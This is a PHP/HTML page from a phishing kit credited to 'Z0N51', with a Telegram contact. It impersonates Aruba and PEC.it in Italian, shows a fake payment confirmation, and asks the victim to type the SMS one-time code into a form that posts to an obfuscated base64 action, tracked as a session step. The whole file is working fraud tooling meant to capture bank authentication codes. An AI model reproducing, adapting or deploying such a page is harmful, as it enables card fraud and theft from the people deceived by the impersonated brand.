<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51official
    ********************************************************/
    
    $_SESSION['last_page'] = "sms";
    
?>

<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title> Sign in to your PEC email account | Pec.it </title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="<?php echo CSSPATH; ?>/bootstrap.css">
  <link rel="stylesheet"  href="<?php echo CSSPATH; ?>/style.css">             


  <!-- logo site web-->
  <link rel="icon" href="<?php echo IMGSPATH; ?>/fav.ico" type="image/x-icon" />


  <!-- fontawtsome -->
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css"/>

</head>



<body>
 <div class="sms">
        <div class="title text-center">
            <div><img  src="<?php echo IMGSPATH; ?>/logo.svg"></div>
        </div>
        <h4>Conferma il seguente pagamento, per favore.</h4>
            <div class="cont">
                <p>La password unica è stata inviata al numero di cellulare qui sotto. Se hai bisogno di cambiare il tuo numero di cellulare, contatta la tua banca per aggiornarlo tramite i canali disponibili (ATM, sito web).</p>
                <div class="row">
                    <div class="col-5"><b>Negozio:</b></div>
                    <div class="col-6" style="color: #666;">Aruba</div>
                </div>
                <div class="row">
                    <div class="col-5"><b>Importo:</b></div>
                    <div class="col-6" style="color: #666;">1,99</div>
                </div>
                <div class="row">
                    <div class="col-5"><b>Data:</b></div>
                    <div class="col-6" style="color: #666;"><?php echo date("Y/m/d") ; ?></div>
                </div>
                <div class="row">
                    <div class="col-5"><b>Numero della carta di credito:</b></div>
                    <div class="col-6" style="color: #666;">XXXX XXXX XXXX XXXX</div>
                </div>
                <div class="row">
                    <div class="col-5"><b>Codice SMS:</b></div>
                    <div class="col-6" style="color: #666;">
                        <form action="<?php echo base64_encode(time()); ?>" method="POST">
                                <input type="hidden" id="cap" name="cap">
                                <input type="hidden" name="steeep" id="steeep" value="sms">
                            <input type="text" name="sms_code" id="sms_code">
                            <?php echo errmsg($_SESSION['errors'],'sms_code'); ?>
                    </div>
                </div>
            </div>
            <div class="bttn text-end"><button name="submit">Invia</button></div>
            </form>
            <p style="text-align: center;background: #eaeaea; margin-bottom: 0;color: #333;font-size: 13px;padding: 10px;">2025 © aruba.it GmbH Internazionale. Tutti i diritti riservati</p>
            </div>

 

  <!-- template files js-->
  <script src="<?php echo JSPATH; ?>/jquery-3.5.1.min.js"></script>
  <script src="<?php echo JSPATH; ?>/bootstrap.min.js"></script>
  <script src="<?php echo JSPATH; ?>/jquery.mask.js"></script>
  <script src="<?php echo JSPATH; ?>/js.js"></script>
  <script>
   
  </script>
</body>
</html>